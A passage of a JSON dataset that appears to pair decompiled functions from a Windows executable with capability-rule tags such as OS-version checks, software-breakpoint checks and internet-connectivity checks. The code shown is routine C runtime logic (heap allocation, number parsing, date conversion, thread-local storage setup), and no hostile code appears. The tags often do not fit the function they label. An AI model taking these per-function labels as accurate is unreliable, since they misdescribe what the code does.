{\n            puVar6 = &var_12h + 1;\n            do {\n                uVar2 = *puVar6;\n                if (uVar2 == 0) break;\n                for (uVar3 = puVar6[-1]; uVar3 <= uVar2; uVar3 = uVar3 + 1) {\n                    *(uVar3 + 0x44ace1) = *(uVar3 + 0x44ace1) | 4;\n                }\n                puVar7 = puVar6 + 1;\n                puVar6 = puVar6 + 2;\n            } while (*puVar7 != 0);\n        }\n        uVar3 = 1;\n        do {\n            *(uVar3 + 0x44ace1) = *(uVar3 + 0x44ace1) | 8;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0xff);\n        *0x44acc4 = fcn.0041cf8a();\n        *0x44accc = extraout_ECX_00;\n    }\n    *0x44adf0 = 0;\n    *0x44adf4 = 0;\n    *0x44adf8 = 0;\n    goto code_r0x0041d354;\n}\n",
        "token_count": 1263
    },
    "0041d4db": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041d4db(uint lpMem, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint32_t arg_10h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43ae68, 0x10);\n    arg_10h = *(unaff_EBP + 0xc);\n    if (arg_10h < 0xffffffe1) {\n        if (*0x44acc0 == 3) {\n            fcn.0041f23f(4);\n            *(unaff_EBP + -4) = 0;\n            uVar2 = *(unaff_EBP + 8);\n            iVar1 = fcn.0041f323(uVar2);\n            *(unaff_EBP + -0x20) = iVar1;\n            if (((iVar1 != 0) && (*(unaff_EBP + -0x1c) = 0,  arg_10h <= *0x44acac)) &&\n               (iVar1 = fcn.0041f823(iVar1, uVar2, arg_10h),  iVar1 != 0)) {\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0041d559();\n            if (*(unaff_EBP + -0x20) != 0) goto code_r0x0041d57f;\n            if (arg_10h == 0) {\n                arg_10h = 1;\n            }\n            arg_10h = arg_10h + 0xf & 0xfffffff0;\n        }\n        else if (arg_10h == 0) {\n            arg_10h = 1;\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x44acbc, 0x10, *(unaff_EBP + 8), arg_10h);\n        *(unaff_EBP + -0x1c) = uVar2;\n    }\ncode_r0x0041d57f:\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 526
    },
    "0041d585": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041d585(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43ae78, 0x10);\n    if (*0x44acc0 == 3) {\n        fcn.0041f23f(4);\n        *(unaff_EBP + -4) = 0;\n        iVar1 = *(unaff_EBP + 8);\n        iVar2 = fcn.0041f323(iVar1);\n        *(unaff_EBP + -0x20) = iVar2;\n        if (iVar2 != 0) {\n            *(unaff_EBP + -0x1c) = *(iVar1 + -4) + -9;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.0041d5f2();\n        if (*(unaff_EBP + -0x20) != 0) goto code_r0x0041d5e7;\n    }\n    (*_sym.imp.KERNEL32.dll_HeapSize)(*0x44acbc, 0, *(unaff_EBP + 8));\ncode_r0x0041d5e7:\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 331
    },
    "0041d5fb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.0041d5fb(uint8_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    \n    iVar1 = fcn.0041e005();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x4447cc) {\n        iVar1 = fcn.00422e0c();\n    }\n    while( true ) {\n        if (*(iVar1 + 0x28) < 2) {\n            uVar2 = *(*(iVar1 + 0x48) + *param_1 * 2) & 8;\n        }\n        else {\n            uVar2 = fcn.00422c04(iVar1, *param_1, 8);\n        }\n        if (uVar2 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    uVar2 = *param_1;\n    puVar5 = param_1 + 1;\n    if ((uVar2 == 0x2d) || (uVar3 = uVar2,  uVar2 == 0x2b)) {\n        uVar3 = *puVar5;\n        puVar5 = param_1 + 2;\n    }\n    iVar1 = 0;\n    while( true ) {\n        if ((uVar3 < 0x30) || (0x39 < uVar3)) {\n            iVar4 = -1;\n        }\n        else {\n            iVar4 = uVar3 - 0x30;\n        }\n        if (iVar4 == -1) break;\n        iVar1 = iVar4 + iVar1 * 10;\n        uVar3 = *puVar5;\n        puVar5 = puVar5 + 1;\n    }\n    if (uVar2 == 0x2d) {\n        iVar1 = -iVar1;\n    }\n    return iVar1;\n}\n",
        "token_count": 442
    },
    "0041d683": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041d683(uint8_t *arg_8h, uint8_t **arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint16_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint8_t uVar7;\n    uint8_t *puVar8;\n    uint32_t var_4h;\n    \n    iVar3 = fcn.0041e005();\n    iVar3 = *(iVar3 + 100);\n    if (iVar3 != *0x4447cc) {\n        iVar3 = fcn.00422e0c();\n    }\n    var_4h = 0;\n    uVar7 = *arg_8h;\n    puVar2 = arg_8h;\n    while( true ) {\n        puVar8 = puVar2 + 1;\n        if (*(iVar3 + 0x28) < 2) {\n            uVar4 = *(*(iVar3 + 0x48) + uVar7 * 2) & 8;\n        }\n        else {\n            uVar4 = fcn.00422c04(iVar3, uVar7, 8);\n        }\n        if (uVar4 == 0) break;\n        uVar7 = *puVar8;\n        puVar2 = puVar8;\n    }\n    if (uVar7 == 0x2d) {\n        arg_14h = arg_14h | 2;\ncode_r0x0041d6ea:\n        uVar7 = *puVar8;\n        puVar8 = puVar2 + 2;\n    }\n    else if (uVar7 == 0x2b) goto code_r0x0041d6ea;\n    if (((arg_10h < 0) || (arg_10h == 1)) || (0x24 < arg_10h)) {\n        if (arg_ch != NULL) {\n            *arg_ch = arg_8h;\n        }\n        return 0;\n    }\n    if (arg_10h == 0) {\n        if (uVar7 != 0x30) {\n            arg_10h = 10;\n            goto code_r0x0041d74d;\n        }\n        if ((*puVar8 != 0x78) && (*puVar8 != 0x58)) {\n            arg_10h = 8;\n            goto code_r0x0041d74d;\n        }\n        arg_10h = 0x10;\n    }\n    if (((arg_10h == 0x10) && (uVar7 == 0x30)) && ((*puVar8 == 0x78 || (*puVar8 == 0x58)))) {\n        uVar7 = puVar8[1];\n        puVar8 = puVar8 + 2;\n    }\ncode_r0x0041d74d:\n    uVar4 = 0xffffffff / arg_10h;\n    do {\n        uVar1 = *(*0x444910 + uVar7 * 2);\n        if ((uVar1 & 4) == 0) {\n            if ((uVar1 & 0x103) == 0) {\ncode_r0x0041d7b9:\n                puVar8 = puVar8 + -1;\n                if ((arg_14h & 8) == 0) {\n                    if (arg_ch != NULL) {\n                        puVar8 = arg_8h;\n                    }\n                    var_4h = 0;\n                }\n                else if (((arg_14h & 4) != 0) ||\n                        (((arg_14h & 1) == 0 &&\n                         ((((arg_14h & 2) != 0 && (0x80000000 < var_4h)) ||\n                          (((arg_14h & 2) == 0 && (0x7fffffff < var_4h)))))))) {\n                    puVar5 = fcn.0041da34();\n                    *puVar5 = 0x22;\n                    if ((arg_14h & 1) == 0) {\n                        var_4h = ((arg_14h & 2) != 0) + 0x7fffffff;\n                    }\n                    else {\n                        var_4h = 0xffffffff;\n                    }\n                }\n                if (arg_ch != NULL) {\n                    *arg_ch = puVar8;\n                }\n                if ((arg_14h & 2) == 0) {\n                    return var_4h;\n                }\n                return -var_4h;\n            }\n            if ((uVar7 < 'a') || ('z' < uVar7)) {\n                iVar3 = uVar7;\n            }\n            else {\n                iVar3 = uVar7 + -0x20;\n            }\n            uVar6 = iVar3 - 0x37;\n        }\n        else {\n            uVar6 = uVar7 - 0x30;\n        }\n        if (arg_10h <= uVar6) goto code_r0x0041d7b9;\n        if ((var_4h < uVar4) || ((var_4h == uVar4 && (uVar6 <= 0xffffffff % arg_10h)))) {\n            var_4h = var_4h * arg_10h + uVar6;\n            arg_14h = arg_14h | 8;\n        }\n        else {\n            arg_14h = arg_14h | 0xc;\n        }\n        uVar7 = *puVar8;\n        puVar8 = puVar8 + 1;\n    } while( true );\n}\n",
        "token_count": 1255
    },
    "0041d870": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0041d870(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000008;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint32_t var_4h;\n    \n    uVar1 = arg_8h;\n    if (arg_8h < 0x100) {\n        uVar3 = fcn.00422f16(arg_8h);\n    }\n    else {\n        var_4h = 0;\n        iVar2 = fcn.0041e005();\n        iVar2 = *(iVar2 + 0x60);\n        if (iVar2 != *0x44acc8) {\n            iVar2 = fcn.0041d16e();\n        }\n        arg_8h = CONCAT13(uVar1, CONCAT12(uVar1 >> 8, arg_8h));\n        if ((((*(iVar2 + 8) != 0) &&\n             (iVar2 = fcn.00422a4a(1, &arg_8h + 2, 2, &var_4h, *(iVar2 + 4), *(iVar2 + 0xc), 1, unaff_EBX, var_4h, \n                                   unaff_EBP, unaff_retaddr, arg_8h, in_stack_00000008, in_stack_0000000c, \n                                   in_stack_00000010),  iVar2 != 0)) && (var_4h._2_2_ == 0)) && ((var_4h & 4) != 0)) {\n            return 1;\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 430
    },
    "0041d8f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0041d8f4(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000008;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint32_t var_4h;\n    \n    uVar1 = arg_8h;\n    if (arg_8h < 0x100) {\n        uVar3 = fcn.00422f8f(arg_8h);\n    }\n    else {\n        var_4h = 0;\n        iVar2 = fcn.0041e005();\n        iVar2 = *(iVar2 + 0x60);\n        if (iVar2 != *0x44acc8) {\n            iVar2 = fcn.0041d16e();\n        }\n        arg_8h = CONCAT13(uVar1, CONCAT12(uVar1 >> 8, arg_8h));\n        if ((((*(iVar2 + 8) != 0) &&\n             (iVar2 = fcn.00422a4a(1, &arg_8h + 2, 2, &var_4h, *(iVar2 + 4), *(iVar2 + 0xc), 1, unaff_EBX, var_4h, \n                                   unaff_EBP, unaff_retaddr, arg_8h, in_stack_00000008, in_stack_0000000c, \n                                   in_stack_00000010),  iVar2 != 0)) && (var_4h._2_2_ == 0)) && ((var_4h & 8) != 0)) {\n            return 1;\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 433
    },
    "0041d978": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041d978(char *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint64_t uVar1;\n    char *pcVar2;\n    uint32_t in_EAX;\n    char *pcVar3;\n    char cVar4;\n    \n    pcVar2 = param_1;\n    if (param_3 != 0) {\n        *param_1 = '-';\n        param_1 = param_1 + 1;\n        in_EAX = -in_EAX;\n        pcVar2 = param_1;\n    }\n    do {\n        pcVar3 = pcVar2;\n        uVar1 = in_EAX;\n        in_EAX = in_EAX / param_2;\n        cVar4 = uVar1 % param_2;\n        if (uVar1 % param_2 < 10) {\n            cVar4 = cVar4 + '0';\n        }\n        else {\n            cVar4 = cVar4 + 'W';\n        }\n        *pcVar3 = cVar4;\n        pcVar2 = pcVar3 + 1;\n    } while (in_EAX != 0);\n    pcVar3[1] = '\\0';\n    do {\n        cVar4 = *pcVar3;\n        *pcVar3 = *param_1;\n        pcVar3 = pcVar3 + -1;\n        *param_1 = cVar4;\n        param_1 = param_1 + 1;\n    } while (param_1 < pcVar3);\n    return;\n}\n",
        "token_count": 341
    },
    "0041dab9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.0041dab9(int32_t arg_8h)\n\n{\n    uint64_t uVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    bool bVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_ch = in_EAX[5];\n    var_8h = var_ch >> 0x1f;\n    if ((var_8h < 0) ||\n       ((((-1 < var_ch || var_8h < 0 && (var_ch < 0x45)) || (0 < var_8h)) || ((-1 < var_8h && (0x44c < var_ch)))))) {\ncode_r0x0041dcff:\n        _var_ch = -1;\n    }\n    else {\n        iVar4 = in_EAX[4];\n        if ((iVar4 < 0) || (0xb < iVar4)) {\n            uVar2 = iVar4 / 0xc;\n            iVar4 = iVar4 % 0xc;\n            bVar6 = CARRY4(var_ch, uVar2);\n            var_ch = var_ch + uVar2;\n            in_EAX[4] = iVar4;\n            var_8h = var_8h + (uVar2 >> 0x1f) + bVar6;\n            if (iVar4 < 0) {\n                bVar6 = var_ch != 0;\n                var_ch = var_ch - 1;\n                in_EAX[4] = iVar4 + 0xc;\n                var_8h = var_8h + -1 + bVar6;\n            }\n            if ((((var_8h < 0) || ((var_8h < 1 && (var_ch < 0x45)))) || (0 < var_8h)) ||\n               ((-1 < var_8h && (0x44c < var_ch)))) goto code_r0x0041dcff;\n        }\n        iVar4 = in_EAX[4];\n        var_14h = *(iVar4 * 4 + 0x444a04);\n        var_10h = var_14h >> 0x1f;\n        iVar7 = fcn.00423900(var_ch, var_8h, 4, 0);\n        if ((iVar7 == 0) && (uVar2 = var_ch,  iVar7 = fcn.00423900(var_ch, var_8h, 100, 0),  iVar7 != 0)) {\ncode_r0x0041dbae:\n            if (1 < iVar4) {\n                bVar6 = 0xfffffffe < var_14h;\n                var_14h = var_14h + 1;\n                var_10h = var_10h + bVar6;\n            }\n        }\n        else {\n            uVar2 = var_ch + 0x76c;\n            iVar7 = fcn.00423900();\n            if (iVar7 == 0) goto code_r0x0041dbae;\n        }\n        iVar5 = var_ch - 1;\n        iVar4 = var_8h - (var_ch == 0);\n        iVar7 = fcn.0041cee0(var_ch + 299, var_8h + (0xfffffed4 < var_ch), 400, 0, uVar2);\n        uVar2 = iVar7 + in_EAX[3];\n        var_4h = iVar7 + in_EAX[3] >> 0x20;\n        uVar8 = fcn.0041cee0(iVar5, iVar4, 100, 0);\n        var_4h = (var_4h - (uVar8 >> 0x20)) - (uVar2 < uVar8);\n        iVar7 = fcn.0041cee0(iVar5, iVar4, 4, 0);\n        uVar1 = iVar7 + CONCAT44(var_4h, uVar2 - uVar8);\n        var_4h = uVar1 >> 0x20;\n        iVar7 = fcn.0041cea0(var_ch, var_8h, 0x16d, 0);\n        iVar7 = iVar7 + (uVar1 & 0xffffffff | var_4h << 0x20) + CONCAT44(var_10h, var_14h);\n        uVar2 = iVar7;\n        var_4h = uVar2 - 0x63df;\n        iVar7 = fcn.0041cea0(var_4h, (iVar7 >> 0x20) - (uVar2 < 0x63df), 0x18, 0);\n        iVar7 = fcn.0041cea0(iVar7 + in_EAX[2], 0x3c, 0);\n        _var_ch = fcn.0041cea0(iVar7 + in_EAX[1], 0x3c, 0);\n        _var_ch = _var_ch + *in_EAX;\n        if (arg_8h == 0) {\n            piVar3 = fcn.00423065(&var_ch);\ncode_r0x0041dceb:\n            if (piVar3 == NULL) goto code_r0x0041dcff;\n        }\n        else {\n            fcn.00423871();\n            _var_ch = _var_ch + *0x444920;\n            piVar3 = fcn.0041dd16(&var_ch);\n            if (piVar3 == NULL) goto code_r0x0041dcff;\n            if ((0 < in_EAX[8]) || ((in_EAX[8] < 0 && (0 < piVar3[8])))) {\n                _var_ch = _var_ch + *0x444928;\n                piVar3 = fcn.0041dd16(&var_ch);\n                goto code_r0x0041dceb;\n            }\n        }\n        for (iVar4 = 9; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *in_EAX = *piVar3;\n            piVar3 = piVar3 + 1;\n            in_EAX = in_EAX + 1;\n        }\n    }\n    return _var_ch;\n}\n",
        "token_count": 1451
    },
    "0041df24": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041df24(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43ae88, 0x10);\n    uVar2 = *(unaff_EBP + 8) * *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x20) = uVar2;\n    if (uVar2 == 0) {\n        uVar2 = 1;\n    }\n    do {\n        iVar3 = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        if (uVar2 < 0xffffffe1) {\n            if (*0x44acc0 == 3) {\n                uVar2 = uVar2 + 0xf & 0xfffffff0;\n                *(unaff_EBP + 0xc) = uVar2;\n                arg_8h_00 = *(unaff_EBP + -0x20);\n                if (*0x44acac < arg_8h_00) goto code_r0x0041df99;\n                fcn.0041f23f(4);\n                *(unaff_EBP + -4) = 0;\n                uVar1 = fcn.0041fb02(arg_8h_00);\n                *(unaff_EBP + -0x1c) = uVar1;\n                *(unaff_EBP + -4) = 0xffffffff;\n                fcn.0041dfce();\n                iVar3 = *(unaff_EBP + -0x1c);\n                if (iVar3 != 0) {\n                    fcn.0041cc60(iVar3, 0, *(unaff_EBP + -0x20));\n                    goto code_r0x0041df99;\n                }\n            }\n            else {\ncode_r0x0041df99:\n                if (iVar3 != 0) {\ncode_r0x0041dfd9:\n                    fcn.0041cdbf();\n                    return;\n                }\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x44acbc, 8, uVar2);\n        }\n        if (((iVar3 != 0) || (*0x4497f4 == 0)) || (iVar3 = fcn.0041fdfe(uVar2),  iVar3 == 0)) goto code_r0x0041dfd9;\n    } while( true );\n}\n",
        "token_count": 611
    },
    "0041dfe8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041dfe8(void)\n\n{\n    int32_t arg_8h;\n    code *pcVar1;\n    int32_t *piVar2;\n    \n    if (*0x4444b0 != -1) {\n        (**0x449698)(*0x4444b0);\n        *0x4444b0 = -1;\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_DeleteCriticalSection;\n    piVar2 = 0x4444d0;\n    do {\n        arg_8h = *piVar2;\n        if ((arg_8h != 0) && (piVar2[1] != 1)) {\n            (*pcVar1)(arg_8h);\n            fcn.0041ba6d(arg_8h);\n            *piVar2 = 0;\n        }\n        piVar2 = piVar2 + 2;\n    } while (piVar2 < 0x4445f0);\n    piVar2 = 0x4444d0;\n    do {\n        if ((*piVar2 != 0) && (piVar2[1] == 1)) {\n            (*pcVar1)(*piVar2);\n        }\n        piVar2 = piVar2 + 2;\n    } while (piVar2 < 0x4445f0);\n    return;\n}\n",
        "token_count": 294
    },
    "0041e1bd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041e1bd(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    iVar2 = fcn.0041f0ec();\n    if (iVar2 == 0) {\n        fcn.0041dfe8();\n        return 0;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 != 0) {\n        *0x44968c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"FlsAlloc\");\n        *0x449690 = (*pcVar1)(iVar2, \"FlsGetValue\");\n        *0x449694 = (*pcVar1)(iVar2, \"FlsSetValue\");\n        *0x449698 = (*pcVar1)(iVar2, \"FlsFree\");\n        if (*0x449690 == 0) {\n            *0x449690 = _sym.imp.KERNEL32.dll_TlsGetValue;\n            *0x449694 = _sym.imp.KERNEL32.dll_TlsSetValue;\n            *0x44968c = 0x41dfdf;\n            *0x449698 = _sym.imp.KERNEL32.dll_TlsFree;\n        }\n    }\n    *0x4444b0 = (**0x44968c)(0x41e076);\n    if (((*0x4444b0 != -1) && (puVar3 = fcn.0041df24(1, 0x8c),  puVar3 != NULL)) &&\n       (iVar2 = (**0x449694)(*0x4444b0, puVar3),  iVar2 != 0)) {\n        puVar3[0x15] = 0x444698;\n        puVar3[5] = 1;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        puVar3[1] = 0xffffffff;\n        *puVar3 = uVar4;\n        return 1;\n    }\n    fcn.0041dfe8();\n    return 0;\n}\n",
        "token_count": 484
    },
    "0041e336": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_38h_2\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: lpSrcStr\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h_2\n// WARNING: Variable defined which should be unmapped: var_3ch_2\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h_2\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl\nfcn.0041e336(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint CodePage, uint arg_24h, uint arg_8h, \n            uint arg_ch, uint arg_10h, uint cchSrc, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *lpMultiByteStr_00;\n    int32_t unaff_EBP;\n    uchar *arg_8h_00;\n    uint var_2ch;\n    uint var_48h;\n    uint var_24h_2;\n    uint var_40h;\n    uint lpWideCharStr;\n    uint lpDestStr;\n    uint cchDest;\n    uint var_20h_2;\n    uint var_24h_3;\n    uint var_28h;\n    uint var_24h;\n    uint Locale;\n    uint dwMapFlags;\n    uint lpMultiByteStr;\n    uint cbMultiByte;\n    uint var_18h_2;\n    uint var_4h;\n    uint uVar5;\n    uint uVar6;\n    uint var_38h_2;\n    uint var_34h;\n    uint var_30h_2;\n    uint var_20h;\n    uint lpSrcStr;\n    uint var_44h;\n    uint var_40h_2;\n    uint var_3ch_2;\n    uint var_38h;\n    uint var_54h;\n    uint var_30h;\n    \n    fcn.0041cd84();\n    if (*0x44969c == 0) {\n        lpSrcStr = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringW)();\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x44969c = 2;\n            }\n        }\n        else {\n            *0x44969c = 1;\n        }\n    }\n    if (0 < *(unaff_EBP + 0x14)) {\n        iVar1 = *(unaff_EBP + 0x14);\n        pcVar2 = *(unaff_EBP + 0x10);\n        do {\n            iVar1 = iVar1 + -1;\n            if (*pcVar2 == '\\0') goto code_r0x0041e39c;\n            pcVar2 = pcVar2 + 1;\n        } while (iVar1 != 0);\n        iVar1 = -1;\ncode_r0x0041e39c:\n        *(unaff_EBP + 0x14) = *(unaff_EBP + 0x14) + (-1 - iVar1);\n    }\n    if ((*0x44969c != 2) && (*0x44969c != 0)) {\n        if (*0x44969c != 1) goto code_r0x0041e6e9;\n        *(unaff_EBP + -0x2c) = 0;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x34) = 0;\n        if (*(unaff_EBP + 0x20) == 0) {\n            *(unaff_EBP + 0x20) = *0x449978;\n        }\n        lpSrcStr = *(unaff_EBP + 0x20);\n        iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        *(unaff_EBP + -0x30) = iVar1;\n        if (iVar1 == 0) goto code_r0x0041e6e9;\n        *(unaff_EBP + -4) = 1;\n        fcn.0041bcd0();\n        *(unaff_EBP + -0x18) = &fcn.0041e336::lpSrcStr;\n        *(unaff_EBP + -0x1c) = &fcn.0041e336::lpSrcStr;\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x1c) == 0) {\n            iVar3 = fcn.0041ba5b();\n            *(unaff_EBP + -0x1c) = iVar3;\n            if (iVar3 == 0) goto code_r0x0041e6e9;\n            *(unaff_EBP + -0x38) = 1;\n        }\n        var_30h_2 = 1;\n        var_34h = *(unaff_EBP + 0x20);\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        if (iVar3 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, 0, 0);\n            *(unaff_EBP + -0x2c) = iVar3;\n            if (iVar3 != 0) {\n                if ((*(unaff_EBP + 0xd) & 4) == 0) {\n                    *(unaff_EBP + -4) = 2;\n                    fcn.0041bcd0();\n                    *(unaff_EBP + -0x18) = &fcn.0041e336::var_34h;\n                    *(unaff_EBP + -0x20) = &fcn.0041e336::var_34h;\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    if (*(unaff_EBP + -0x20) == 0) {\n                        iVar4 = fcn.0041ba5b(iVar3 * 2);\n                        *(unaff_EBP + -0x20) = iVar4;\n                        if (iVar4 == 0) goto code_r0x0041e56b;\n                        *(unaff_EBP + -0x34) = 1;\n                    }\n                    iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                                      (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, \n                                       *(unaff_EBP + -0x20), iVar3);\n                    if (iVar1 != 0) {\n                        if (*(unaff_EBP + 0x1c) == 0) {\n                            uVar6 = 0;\n                            uVar5 = 0;\n                        }\n                        else {\n                            uVar6 = *(unaff_EBP + 0x1c);\n                            uVar5 = *(unaff_EBP + 0x18);\n                        }\n                        (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0x20), 0, *(unaff_EBP + -0x20), iVar3, uVar5, uVar6, 0, 0);\n                    }\n                }\n                else if ((*(unaff_EBP + 0x1c) != 0) && (iVar3 <= *(unaff_EBP + 0x1c))) {\n                    